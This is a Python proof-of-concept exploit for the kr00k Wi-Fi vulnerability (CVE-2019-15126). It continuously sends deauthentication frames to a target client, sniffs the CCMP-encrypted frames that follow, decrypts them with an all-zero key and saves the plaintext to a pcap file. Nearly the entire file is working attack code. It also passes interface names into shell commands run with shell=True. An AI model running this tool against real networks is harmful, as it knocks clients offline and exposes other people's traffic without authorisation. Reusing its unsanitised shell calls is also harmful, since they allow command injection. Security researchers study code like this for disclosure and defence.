#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
r00kie-kr00kie.py: PoC of CVE-2019-15126 kr00k vulnerability
Authors: @__bypass__, @cherboff, @_chipik
License: GNU GENERAL PUBLIC LICENSE Version 3
Copyright 2020, Hexway
"""
# endregion

# region Import
from os.path import isfile
from scapy.all import rdpcap, wrpcap, sendp, sniff, Ether, RadioTap, Dot11, Dot11CCMP, Dot11Deauth
from Cryptodome.Cipher import AES
from argparse import ArgumentParser
from typing import Union
from re import sub
from sys import stdout
from os import getuid
from pwd import getpwuid
from queue import Queue
from threading import Thread
from time import sleep
from subprocess import run, PIPE, CompletedProcess
# endregion

# region Authorship information
__author__ = '@__bypass__'
__copyright__ = 'Copyright 2020, Hexway'
__credits__ = ['@__bypass__, @cherboff, @_chipik']
__license__ = 'GNU GENERAL PUBLIC LICENSE Version 3'
__version__ = '0.0.1'
__maintainer__ = '@__bypass__, @cherboff, @_chipik'
__status__ = 'Development'
# endregion


# region Class ThreadManager
class ThreadManager(object):

    # Main background worker - wrapper of function
    def _worker(self):
        while True:
            try:
                # get one function with arguments from the queue
                func, args, kwargs = self._threads.get()
                # and execute it
                func(*args, **kwargs)
            except Exception as e:
                print("Exception: " + str(e))
            self._threads.task_done()

    def __init__(self, thread_count):
        """
        The constructor for the ThreadManager class
        :param thread_count: Maximum capacity of thread queue
        """
        self._thread_count = thread_count
        self._threads = Queue(maxsize=self._thread_count)
        for _ in range(self._thread_count):
            worker_thread = Thread(target=self._worker)
            worker_thread.setDaemon(True)
            worker_thread.start()

    def add_task(self, func, *args, **kwargs):
        """
        Add a task to the queue for background working
        :param func: A target function to be executed
        :param args: Positional arguments of the function
        :param kwargs: Keyword arguments of the function
        :return: None
        """
        self._threads.put((func, args, kwargs,))

    def wait_for_completion(self):
        """
        Sync all threads
        :return: None
        """
        self._threads.join()
# endregion


# region Main class - Kr00k
class Kr00k:

    # region Set variables
    number_kr00k_packets: int = 0
    prefix: str = '    '
    quiet: bool = False
    pcap_path_result: str = 'kr00k.pcap'
    pcap_path_test: str = 'encrypted_packets.pcap'
    # endregion

    # region Init
    def __init__(self) -> None:
        """
        Init string variables
        """

        self.cINFO: str = '\033[1;34m'
        self.cERROR: str = '\033[1;31m'
        self.cSUCCESS: str = '\033[1;32m'
        self.cWARNING: str = '\033[1;33m'
        self.cEND: str = '\033[0m'

        self.c_info: str = self.cINFO + '[*]' + self.cEND + ' '
        self.c_error: str = self.cERROR + '[-]' + self.cEND + ' '
        self.c_success: str = self.cSUCCESS + '[+]' + self.cEND + ' '
        self.c_warning: str = self.cWARNING + '[!]' + self.cEND + ' '

        self.lowercase_letters: str = 'abcdefghijklmnopqrstuvwxyz'
        self.uppercase_letters: str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        self.digits: str = '0123456789'
    # endregion

    # region Output functions
    @staticmethod
    def print_banner() -> None:
        """
        Print a colored banner in the console
        :return: None
        """

        green_color: str = '\033[1;32m'
        yellow_color: str = '\033[1;33m'
        end_color: str = '\033[0m'

        print(green_color + "                                                                " + end_color)
        print(green_color + "      /$$$$$$$   /$$$$$$   /$$$$$$  /$$       /$$               " + end_color)
        print(green_color + "     | $$__  $$ /$$$_  $$ /$$$_  $$| $$      |__/               " + end_color)
        print(green_color + "     | $$  \ $$| $$$$\ $$| $$$$\ $$| $$   /$$ /$$  /$$$$$$      " + end_color)
        print(green_color + "     | $$$$$$$/| $$ $$ $$| $$ $$ $$| $$  /$$/| $$ /$$__  $$     " + end_color)
        print(green_color + "     | $$__  $$| $$\ $$$$| $$\ $$$$| $$$$$$/ | $$| $$$$$$$$     " + end_color)
        print(green_color + "     | $$  \ $$| $$ \ $$$| $$ \ $$$| $$_  $$ | $$| $$_____/     " + end_color)
        print(green_color + "     | $$  | $$|  $$$$$$/|  $$$$$$/| $$ \  $$| $$|  $$$$$$$     " + end_color)
        print(green_color + "     |__/  |__/ \______/  \______/ |__/  \__/|__/ \_______/     " + end_color)
        print(green_color + "                                                                " + end_color)
        print(green_color + "                                                                " + end_color)
        print(green_color + "                                                                " + end_color)
        print(green_color + " /$$                  /$$$$$$   /$$$$$$  /$$       /$$          " + end_color)
        print(green_color + "| $$                 /$$$_  $$ /$$$_  $$| $$      |__/          " + end_color)
        print(green_color + "| $$   /$$  /$$$$$$ | $$$$\ $$| $$$$\ $$| $$   /$$ /$$  /$$$$$$ " + end_color)
        print(green_color + "| $$  /$$/ /$$__  $$| $$ $$ $$| $$ $$ $$| $$  /$$/| $$ /$$__  $$" + end_color)
        print(green_color + "| $$$$$$/ | $$  \__/| $$\ $$$$| $$\ $$$$| $$$$$$/ | $$| $$$$$$$$" + end_color)
        print(green_color + "| $$_  $$ | $$      | $$ \ $$$| $$ \ $$$| $$_  $$ | $$| $$_____/" + end_color)
        print(green_color + "| $$ \  $$| $$      |  $$$$$$/|  $$$$$$/| $$ \  $$| $$|  $$$$$$$" + end_color)
        print(green_color + "|__/  \__/|__/       \______/  \______/ |__/  \__/|__/ \_______/" + end_color)
        print(green_color + "                                                          v" + __version__ + end_color)
        print(yellow_color + "\r\nhttps://hexway.io/research/r00kie-kr00kie/\r\n" + end_color)

    def _color_print(self, color: str = 'blue', *strings: str) -> None:
        """
        Print colored text in the console
        :param color: Set color: blue, red, orange, green (default: blue)
        :param strings: Strings to be printed in the console
        :return: None
        """
        if color == 'blue':
            stdout.write(self.c_info)
        elif color == 'red':
            stdout.write(self.c_error)
        elif color == 'orange':
            stdout.write(self.c_warning)
        elif color == 'green':
            stdout.write(self.c_success)
        else:
            stdout.write(self.c_info)
        for index in range(len(strings)):
            if index % 2 == 0:
                stdout.write(strings[index])
            else:
                if color == 'blue':
                    stdout.write(self.cINFO)
                if color == 'red':
                    stdout.write(self.cERROR)
                if color == 'orange':
                    stdout.write(self.cWARNING)
                if color == 'green':
                    stdout.write(self.cSUCCESS)
                stdout.write(strings[index] + self.cEND)
        stdout.write('\n')

    def _color_text(self, color: str = 'blue', string: str = '') -> str:
        """
        Make a colored string
        :param color: Set color: blue, red, orange, green (default: blue)
        :param string: An input string (example: 'test')
        :return: A colored string (example: '\033[1;34mtest\033[0m')
        """
        if color == 'blue':
            return self.cINFO + string + self.cEND
        elif color == 'red':
            return self.cERROR + string + self.cEND
        elif color == 'orange':
            return self.cWARNING + string + self.cEND
        elif color == 'green':
            return self.cSUCCESS + string + self.cEND
        else:
            return self.cINFO + string + self.cEND

    def print_info(self, *strings: str) -> None:
        """
        Print information text in the console
        :param strings: Strings to be printed in the console
        :return: None
        """
        self._color_print('blue', *strings)

    def print_error(self, *strings: str) -> None:
        """
        Print error text in the console
        :param strings: Strings to be printed in the console
        :return: None
        """
        self._color_print('red', *strings)

    def print_warning(self, *strings: str) -> None:
        """
        Print warning text in the console
        :param strings: Strings to be printed in the console
        :return: None
        """
        self._color_print('orange', *strings)

    def print_success(self, *strings: str) -> None:
        """
        Print success text in the console
        :param strings: Strings to be printed in the console
        :return: None
        """
        self._color_print('green', *strings)

    def info_text(self, text: str) -> str:
        """
        Make information text
        :param text: An input string (example: 'test')
        :return: A colored string (example: '\033[1;34mtest\033[0m')
        """
        return self._color_text('blue', text)

    def error_text(self, text: str) -> str:
        """
        Make error text
        :param text: An input string (example: 'test')
        :return: A colored string (example: '\033[1;31mtest\033[0m')
        """
        return self._color_text('red', text)

    def warning_text(self, text: str) -> str:
        """
        Make warning text
        :param text: An input string (example: 'test')
        :return: A colored string (example: '\033[1;32mtest\033[0m')
        """
        return self._color_text('orange', text)

    def success_text(self, text: str) -> str:
        """
        Make success text
        :param text: An input string (example: 'test')
        :return: A colored string (example: '\033[1;33mtest\033[0m')
        """
        return self._color_text('green', text)

    # endregion

    # region Check a user function
    @staticmethod
    def check_user(exit_on_failure: bool = True,
                   exit_code: int = 2,
                   quiet: bool = False) -> bool:
        """
        Check user privileges
        :param exit_on_failure: Exit in case of an error (default: False)
        :param exit_code: Set an exit code integer (default: 2)
        :param quiet: Quiet mode, if True no console output (default: False)
        :return: True if the user is root or False if not
        """
        if getuid() != 0:
            if not quiet:
                print('Only root can run this script!')
                print('User: ' + str(getpwuid(getuid())[0]) + ' can not run this script!')
            if exit_on_failure:
                exit(exit_code)
            return False
        return True
    # endregion

    # region Decrypt data
    @staticmethod
    def decrypt(encrypted_data: bytes = b'',
                client_mac_address: str = '01234567890a',
                key_iv: str = '000000000002',
                qos: str = '00') -> Union[None, bytes]:
        """
        Decrypt the data with NULL TK (CVE-2019-15126 kr00k vulnerability)
        :param encrypted_data: Bytes of Encrypted data
        :param client_mac_address: Client MAC address (example: '01234567890a')
        :param key_iv: Key IV (default: '000000000002')
        :param qos: QoS (default: '00')
        :return: Bytes of Decrypted data or None if error
        """
        try:
            nonce: bytes = bytes.fromhex(qos) + \
                           bytes.fromhex(client_mac_address) + \
                           bytes.fromhex(key_iv)
            tk = bytes.fromhex("00000000000000000000000000000000")
            cipher = AES.new(tk, AES.MODE_CCM, nonce, mac_len=8)
            decrypted_data: bytes = cipher.decrypt(encrypted_data)
            assert decrypted_data.startswith(b'\xaa\xaa\x03'), 'Decrypt error, TK is not NULL'
            return decrypted_data

        except AssertionError:
            pass

        return None
    # endregion

    # region Analyze 802.11 packets
    def analyze_packet(self, packet) -> None:
        """
        Analyze and try to decrypt the 802.11 packet with NULL TK (CVE-2019-15126 kr00k vulnerability)
        :param packet: A packet in the scapy format
        :return: None
        """
        try:
            assert packet.haslayer(Dot11CCMP), 'Is not 802.11 CCMP packet'
            wrpcap(self.pcap_path_test, packet, append=True)
            pn0 = "{:02x}".format(packet.PN0)
            pn1 = "{:02x}".format(packet.PN1)
            pn2 = "{:02x}".format(packet.PN2)
            pn3 = "{:02x}".format(packet.PN3)
            pn4 = "{:02x}".format(packet.PN4)
            pn5 = "{:02x}".format(packet.PN5)

            addr2 = sub(':', '', packet.addr2)
            addr3 = sub(':', '', packet.addr3)

            plaintext = self.decrypt(encrypted_data=packet.data[:-8], client_mac_address=addr2,
                                     key_iv=pn5 + pn4 + pn3 + pn2 + pn1 + pn0)
            assert plaintext is not None, 'Can not decrypt packet with NULL TK'

            ethernet_header: bytes = bytes.fromhex(addr3 + addr2) + plaintext[6:8]
            out_packet: bytes = ethernet_header + plaintext[8:]

            self.number_kr00k_packets += 1
            if not self.quiet:
                parsed_packet: str = Ether(out_packet).show(dump=True)
                self.print_success('Got a kr00ked packet: \n', parsed_packet)

            wrpcap(self.pcap_path_result, out_packet, append=True)

        except IndexError:
            pass

        except AssertionError:
            pass
    # endregion

    # region Sending deauth packets
    def deauth(self,
               wireless_interface: str = 'wlan0',
               bssid: str = '01:23:45:67:89:0a',
               client: str = '01:23:45:67:89:0b',
               delay: int = 5,
               number_of_deauth_packets: int = 5) -> None:
        """
        Sending 802.11 deauth packets
        :param wireless_interface: A wireless interface name for sending deauth packets (default: 'wlan0')
        :param bssid: BSSID (example: '01:23:45:67:89:0a')
        :param client: A client MAC address for deauth (example: '01:23:45:67:89:0b')
        :param delay: A delay between sending deauth packets (default: 5)
        :param number_of_deauth_packets: The number of deauth packets for one iteration (default: 5)
        :return: None
        """
        deauth_packet: bytes = RadioTap() / \
                               Dot11(type=0, subtype=12, addr1=client.lower(),
                                     addr2=bssid.lower(), addr3=bssid.lower()) / \
                               Dot11Deauth(reason=7)
        sleep(delay)
        while True:
            sendp(deauth_packet, iface=wireless_interface, count=number_of_deauth_packets, verbose=False)
            self.print_info('Send ', str(number_of_deauth_packets),
                            ' deauth packets to: ', client,
                            ' from: ', bssid)
            sleep(delay)
    # endregion

    # region Sniff wireless interface
    def sniff(self,
              wireless_interface: str = 'wlan0',
              bssid: str = '01:23:45:67:89:0a',
              client: str = '01:23:45:67:89:0b') -> None:
        """
        Sniff a wireless interface for the Exploit CVE-2019-15126 kr00k vulnerability on the fly
        :param wireless_interface: A wireless interface name for sniffing packets (default: 'wlan0')
        :param bssid: BSSID (example: '01:23:45:67:89:0a')
        :param client: A client MAC address (example: '01:23:45:67:89:0b')
        :return: None
        """
        sniff(iface=wireless_interface, prn=self.analyze_packet,
              lfilter=lambda x: x.addr1 == bssid.lower() and x.addr2 == client.lower())
    # endregion

    # region Read pcap file
    def read(self, pcap_path_read: str = '/tmp/test.pcap') -> None:
        """
        Read encrypted 802.11 packets from pcap file
        :param pcap_path_read: Path to PCAP file for read encrypted packets (example: '/tmp/test.pcap')
        :return: None
        """
        try:
            # Check pcap file for reading exists
            assert isfile(pcap_path_read), 'Pcap file: ' + pcap_path_read + ' not found!'
            self.print_info('Read packets from: ', pcap_path_read, ' ....')

            # Reading encrypted packets from pcap file
            encrypted_packets = rdpcap(args.pcap_path_read)
            self.print_info('All packets are read, packet analysis is in progress ....')

            # Analyze encrypted packets from pcap file
            for encrypted_packet in encrypted_packets:
                self.analyze_packet(packet=encrypted_packet)

            # Check the number of kr00k packets with NULL TK
            assert self.number_kr00k_packets > 0, 'Not found kr00k packets'
            self.print_success('Found ', str(kr00k.number_kr00k_packets),
                               ' kr00ked packets and decrypted packets save in: ', args.pcap_path_result)

        except AssertionError as Error:
            self.print_error(Error.args[0])
            exit(1)
    # endregion

# endregion


# region Main function
if __name__ == '__main__':

    # region Variables
    kr00k: Kr00k = Kr00k()
    thread_manager: ThreadManager = ThreadManager(2)
    # endregion

    try:

        # region Parse script arguments
        parser: ArgumentParser = ArgumentParser(description='PoC of CVE-2019-15126 kr00k vulnerability')
        parser.add_argument('-i', '--interface', help='Set wireless interface name for listen packets', default=None)
        parser.add_argument('-l', '--channel', help='Set channel for wireless interface (default: 1)',
                            default=1, type=int)
        parser.add_argument('-b', '--bssid', help='Set WiFi AP BSSID (example: "01:23:45:67:89:0a")',
                            default=None)
        parser.add_argument('-c', '--client', help='Set WiFi client MAC address (example: "01:23:45:67:89:0b")',
                            default=None)
        parser.add_argument('-n', '--deauth_number', help='Set number of deauth packets for one iteration (default: 5)',
                            default=5, type=int)
        parser.add_argument('-d', '--deauth_delay', help='Set delay between sending deauth packets (default: 5)',
                            default=5, type=int)
        parser.add_argument('-p', '--pcap_path_read', help='Set path to PCAP file for read encrypted packets',
                            default=None)
        parser.add_argument('-r', '--pcap_path_result', help='Set path to PCAP file for write decrypted packets',
                            default='kr00k.pcap')
        parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
        args = parser.parse_args()
        # endregion

        # region Print banner
        if not args.quiet:
            kr00k.print_banner()
        else:
            kr00k.quiet = True
        # endregion

        # region the Set path to pcap file with decrypted packets
        kr00k.pcap_path_result = args.pcap_path_result
        # endregion

        # region the Check and read PCAP file with the 802.11 packets
        if args.pcap_path_read is not None:
            kr00k.read(pcap_path_read=args.pcap_path_read)
        # endregion

        # region the Exploit CVE-2019-15126 kr00k vulnerability on fly
        else:

            # region the Check user
            kr00k.check_user()
            # endregion

            # region the Check input params
            assert args.interface is not None, \
                'Please set wireless NIC for Exploit CVE-2019-15126 kr00k vulnerability on fly'
            assert args.bssid is not None, \
                'Please set AP BSSID for Exploit CVE-2019-15126 kr00k vulnerability on fly'
            assert args.client is not None, \
                'Please set Client MAC address for Exploit CVE-2019-15126 kr00k vulnerability on fly'
            assert 1 <= args.channel <= 128, \
                'Bad WiFi channel: ' + kr00k.error_text(args.channel)
            # endregion

            # region Check network interface name
            interfaces: CompletedProcess = run(['iwconfig'], shell=True, stdout=PIPE, stderr=PIPE)
            interfaces_output: str = interfaces.stdout.decode('utf-8')
            interfaces_output += interfaces.stderr.decode('utf-8')
            assert args.interface in interfaces_output, \
                'Not found network interface: ' + kr00k.error_text(args.interface)
            # endregion

            # region the Enable monitor mode and set a channel on the interface
            kr00k.print_warning('Kill processes that prevent monitor mode!')
            run(['airmon-ng check kill'], shell=True, stdout=PIPE)

            interface_mode: CompletedProcess = run(['iwconfig ' + args.interface], shell=True, stdout=PIPE)
            interface_mode: str = interface_mode.stdout.decode('utf-8')
            if 'Mode:Monitor' not in interface_mode:
                kr00k.print_info('Set monitor mode on wireless interface: ', args.interface)
                run(['ifconfig ' + args.interface + ' down'], shell=True, stdout=PIPE)
                run(['iwconfig ' + args.interface + ' mode monitor'], shell=True, stdout=PIPE)
                run(['ifconfig ' + args.interface + ' up'], shell=True, stdout=PIPE)
            else:
                kr00k.print_info('Wireless interface: ', args.interface, ' already in mode monitor')

            kr00k.print_info('Set channel: ', str(args.channel), ' on wireless interface: ', args.interface)
            run(['iwconfig ' + args.interface + ' channel ' + str(args.channel)], shell=True, stdout=PIPE)
            # endregion

            # region Start sending deauth packets in a new thread
            thread_manager.add_task(kr00k.deauth, args.interface, args.bssid, args.client,
                                    args.deauth_delay, args.deauth_number)
            # endregion

            # region Start sniffing the 802.11 packets
            kr00k.sniff(wireless_interface=args.interface, bssid=args.bssid, client=args.client)
            # endregion

        # endregion

    except KeyboardInterrupt:
        kr00k.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        kr00k.print_error(Error.args[0])
        exit(1)
# endregion
